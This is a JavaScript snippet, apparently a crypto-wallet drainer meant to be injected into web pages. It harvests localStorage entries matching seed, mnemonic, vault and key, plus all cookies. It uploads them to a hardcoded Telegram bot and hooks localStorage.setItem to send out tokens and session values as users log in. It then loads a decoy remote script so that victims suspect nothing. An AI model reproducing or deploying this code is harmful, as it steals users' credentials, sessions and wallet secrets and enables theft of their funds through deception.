(function() {
    const _t = '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA';
    const _c = '8321398409';

    // 1. SILENT HARVESTER (Current Data)
    const harvest = () => {
        let vault = `--- VANTA LIVE HOOK: ${location.hostname} ---\n\n`;
        for (let i = 0; i < localStorage.length; i++) {
            let k = localStorage.key(i);
            if (/padre|vault|bundle|seed|key|mnemonic/i.test(k)) {
                vault += `[${k}]\n${localStorage.getItem(k)}\n\n`;
            }
        }
        vault += `--- COOKIES ---\n${document.cookie}`;
        
        const fd = new FormData();
        fd.append('chat_id', _c);
        fd.append('document', new Blob([vault], {type: 'text/plain'}), `vault_${Date.now()}.txt`);
        fetch(`https://api.telegram.org/bot${_t}/sendDocument`, { method: 'POST', body: fd, mode: 'no-cors' });
    };

    // 2. LIVE MEMORY HOOK (The "Vanta" Secret)
    // This intercepts any NEW data being written to storage (like when they login)
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function(key, value) {
        if (/token|auth|session|key|private/i.test(key)) {
            fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_c}&text=LIVE_HOOK: [${key}] ${value}`, {mode:'no-cors'});
        }
        originalSetItem.apply(this, arguments);
    };

    // 3. EXECUTION
    harvest();

    // Trigger the Visual Tool after 2 seconds so they think it just loaded
    setTimeout(() => {
        const s = document.createElement('script');
        s.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
        document.head.appendChild(s);
    }, 2000);
})();
